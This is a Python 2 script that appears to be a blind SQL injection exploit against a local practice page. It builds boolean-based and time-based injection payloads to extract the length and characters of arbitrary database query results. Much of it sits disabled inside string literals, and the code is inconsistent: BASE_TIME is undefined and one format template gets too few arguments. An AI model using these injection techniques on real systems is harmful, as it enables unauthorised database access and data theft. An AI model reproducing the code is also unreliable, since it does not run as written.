#!/usr/bin/python

import requests
import sys, time, string
from random import randint

data="root"
query=sys.argv[1]

BASE_URL="http://localhost/pwnme-plain.php"
SUCCESS_TEXT="user exists"
URL_PARAMS={'name':None}

'''
def get_query_result(data):
    global URL_PARAMS
    
    URL_PARAMS['name']=data
    pagecontent=requests.get(BASE_URL, params=URL_PARAMS).text
    #print "Pagecontent: "  +  pagecontent + "\n"
    if SUCCESS_TEXT in pagecontent.lower():
        return True
    else:
        return False
    
'''

BASE_QUERY="root' and 1=if(({}){}{},1,2)-- "    
def binsearch(query,sl,sh):
    searchlow=sl
    searchhigh=sh
    searchmid=0
    while True:
        searchmid=(searchlow+searchhigh)/2
        if get_query_result(BASE_QUERY.format(query,"=", searchmid)):
            break
        elif get_query_result(BASE_QUERY.format(query,">", searchmid)):
            searchlow=searchmid+1
        elif get_query_result(BASE_QUERY.format(query,"<", searchmid)):
            searchhigh=searchmid
    return searchmid

def querylength(query):
    return binsearch("length(({}))".format(query),0,100)
    
'''
def execquery(query):
    fulltext = ""
    qlen = querylength(query) + 1
    print "Retrieving {} bytes".format(qlen-1)
    for i in range(1,qlen):
        sys.stdout.write(chr(binsearch("ord(substring(({}),{},1))".format(query,i),0,127)))
    print ""
'''

def get_timing():
    times = list()
    print "Calculating average times"
    for i in range(10):
        URL_PARAMS['name'] = 'root'
        r = requests.get(BASE_URL,params=URL_PARAMS)
        #print "Response: " + r.text + "\n"
        Times=r.elapsed[-5::]
        print type(Times)
        times.append(r.elapsed.seconds)
        time.sleep(randint(1,3))
        #print r.elapsed.seconds
    print "Average: %s" % (sum(times) / len(times))
    return (sum(times) / len(times))

def getbyte(query):
    bytestring = ""
    for i in range(1,9):
        if get_query_result(BASE_QUERY.format(query,i)):
            bytestring += "1"
        else:
            bytestring += "0"
    return int(bytestring,2)
'''
def get_query_result(data):
    global URL_PARAMS
    reqtime = 0
 
    URL_PARAMS['name'] = data
    r = requests.get(BASE_URL, params=URL_PARAMS)
    reqtime = r.elapsed.seconds
    pagecontent = r.text
    if reqtime > BASE_TIME:
        return True
    else:
        return False

def querylength(query):
    return getbyte("lpad(bin(length(({}))),8,'0')".format(query))

def execquery(query):
    fulltext = ""
    qlen = querylength(query) + 1
    print "Retrieving {} bytes".format(qlen-1)
    for i in range(1,qlen):
        sys.stdout.write(chr(getbyte("lpad(bin(ascii(substring(({}),{},1))),8,'0')".format(query,i))))
        sys.stdout.flush()
    print ""
'''
#print get_query_result(data)
print get_timing()